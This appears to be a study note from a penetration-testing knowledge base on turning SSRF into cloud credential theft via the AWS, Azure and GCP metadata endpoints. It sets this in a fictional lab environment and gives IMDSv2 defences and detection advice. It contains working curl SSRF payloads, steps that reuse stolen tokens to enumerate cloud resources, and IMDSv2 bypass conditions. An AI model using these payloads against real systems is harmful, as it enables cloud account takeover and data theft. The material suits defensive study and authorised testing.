---
title: SSRF to Metadata & Credential Theft
aliases:
  - SSRF Cloud
  - IMDS Attack
  - Metadata API
tags:
  - tree/cloud
  - cyber/content
  - difficulty/practitioner
Domain:
  - "[[Cloud-Native Attack Paths]]"
Color: "#FABED4"
verified: 2026-09-05
---

# SSRF to Metadata & Credential Theft

> [!abstract] One sentence
> Every major cloud provider exposes a metadata API reachable only from within the instance — Server-Side Request Forgery turns a web application vulnerability into cloud credential theft and, frequently, privilege escalation to the instance's IAM role.

**Before you read:** APP01 (10.10.20.30) is a web server running in Azure. It has a Managed Identity attached with Contributor rights on the resource group. You find an SSRF vulnerability in its image-processing endpoint. What can you do with it? Hold your answer.

## Parent Learning Order
[[Cloud-Native Attack Paths]] → **SSRF to Metadata & Credential Theft** → [[Cloud Lateral Movement]]

---

## The Metadata API

Cloud providers expose an HTTP endpoint, reachable only from within the instance, that returns instance identity, configuration, and — critically — temporary IAM credentials for the attached role or managed identity.

| Provider | Endpoint | Credential path |
|---|---|---|
| AWS | `http://169.254.169.254/latest/` | `/meta-data/iam/security-credentials/<role-name>` |
| Azure | `http://169.254.169.254/metadata/instance` | `http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | `/instance/service-accounts/default/token` |

These credentials are short-lived (typically 1 hour) and automatically rotated — but a single fetch gives an attacker an hour-long session token with the instance's full IAM permissions.

---

## Finding and Exploiting SSRF

```bash
# Classic SSRF probe — if the app fetches a URL parameter, try the metadata endpoint
curl "https://app01.meridian.test/fetch?url=http://169.254.169.254/latest/meta-data/"

# Expected response if SSRF exists and no IMDSv2 protection:
# ami-id
# hostname
# iam/
# instance-id
# local-ipv4
# ...

# Drill into the IAM credentials path
curl "https://app01.meridian.test/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# MeridianAppRole

curl "https://app01.meridian.test/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MeridianAppRole"
# {
#   "AccessKeyId"     : "ASIA1234567890EXAMPLE",
#   "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
#   "Token"           : "AQoXnyc4lcK4w...session-token...",
#   "Expiration"      : "2026-09-05T12:00:00Z"
# }
```

With these credentials, configure AWS CLI locally and operate with the instance's full permissions:

```bash
export AWS_ACCESS_KEY_ID=ASIA1234567890EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=AQoXnyc4lcK4w...
aws sts get-caller-identity
# {"Arn": "arn:aws:iam::123456789012:assumed-role/MeridianAppRole/i-0abcdef1234567890"}
aws s3 ls  # list all S3 buckets the role can access
aws secretsmanager list-secrets  # list Secrets Manager entries
```

---

## Azure IMDS — Managed Identity Token

APP01 (10.10.20.30) runs in Azure with a Managed Identity attached.

```bash
# SSRF to Azure IMDS — Metadata: true header required
# The header requirement means blind SSRF (no response body) is not enough —
# you need the response, so reflected SSRF or out-of-band exfiltration is needed

curl "https://app01.meridian.test/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2018-02-01"      -H "Metadata: true"

# Response:
# {"access_token":"eyJ0eXAiOiJKV1Qi...","expires_in":"3599","token_type":"Bearer"}

# Use token against Azure Resource Manager API
TOKEN="eyJ0eXAiOiJKV1Qi..."
curl -s -H "Authorization: Bearer $TOKEN"   "https://management.azure.com/subscriptions?api-version=2020-01-01" | python3 -m json.tool
# Lists all Azure subscriptions the Managed Identity (Contributor) can see
```

> [!tip] The analogy, and where it breaks
> The metadata API is a concierge desk inside the building — it gives out the building's master keycard to anyone who asks from inside. SSRF is a way to use someone else's phone to call the desk from inside.
>
> **The deliberate break:** IMDSv2 (AWS) and the Azure `Metadata: true` header requirement are defences — they prevent simple SSRF (a forged URL with no control over headers). But SSRF where the attacker controls the full request, or where the application forwards headers, still bypasses them.

---

## IMDSv2 — Why It Matters and How It Fails

AWS IMDSv2 requires a two-step flow: first PUT to get a session token, then GET with that token. This breaks simple SSRF that can only forge the URL.

```bash
# IMDSv2 flow (from inside the instance — legitimate use)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token"   -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/"   -H "X-aws-ec2-metadata-token: $TOKEN"
```

**IMDSv2 bypass conditions:**
- The web application makes arbitrary HTTP requests and **forwards all request headers** (e.g. a proxy service, a PDF renderer, a webhook tester) — the attacker can inject the PUT step
- The application uses an HTTP library that follows redirects — a `301 → http://169.254.169.254/...` chain that switches methods (uncommon but documented)
- The EC2 instance has `hop_limit=2` configured (default for containers) — allows one redirect

**Defence:** enforce `hop_limit=1` (default for bare EC2), enable IMDSv2-only in instance metadata options, and block `169.254.169.254` at the WAF/security group level for applications that have no legitimate need to access it.

---

## GCP Metadata Server

```bash
# GCP IMDS — requires Metadata-Flavor: Google header
curl "https://app.meridian.test/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"      -H "Metadata-Flavor: Google"
# {"access_token":"ya29.c.Ko8B...","expires_in":3599,"token_type":"Bearer"}

# Use token to enumerate GCP resources
curl -s -H "Authorization: Bearer ya29.c.Ko8B..."   "https://www.googleapis.com/compute/v1/projects/meridian-freight/instances" |   python3 -m json.tool | grep "name"
```

---

## Security Implications

- **Credential scope = blast radius:** the damage from an SSRF-to-IMDS exploit is exactly the IAM permissions attached to the compromised instance role — an overprivileged Managed Identity or EC2 role turns a low-severity SSRF into account-level compromise.
- **Short-lived but enough:** 1-hour session tokens are long enough to enumerate, exfiltrate, and establish persistence (e.g. add a new IAM user, spin up a rogue instance) before expiry.
- **Detection:** AWS GuardDuty detects IMDS credential use from unusual source IPs; Azure Defender for Cloud flags anomalous Managed Identity token usage. The credential's UserAgent string and source IP in CloudTrail / Azure Activity logs is the key artefact.

---

## Summary

- Every cloud instance exposes a metadata API on `169.254.169.254` that returns temporary IAM credentials; SSRF in any application running on the instance is a direct path to those credentials and the full permissions of the attached role.
- IMDSv2 (AWS) and header requirements (Azure, GCP) block simple URL-only SSRF but are bypassable when the vulnerable application forwards request headers or follows cross-method redirects.
- The blast radius is the instance's IAM role — over-provisioned roles (Contributor, AdministratorAccess) turn SSRF into account takeover; least-privilege role scoping is the most effective mitigation.

---
> 🔼 Up: [[Cloud-Native Attack Paths]]
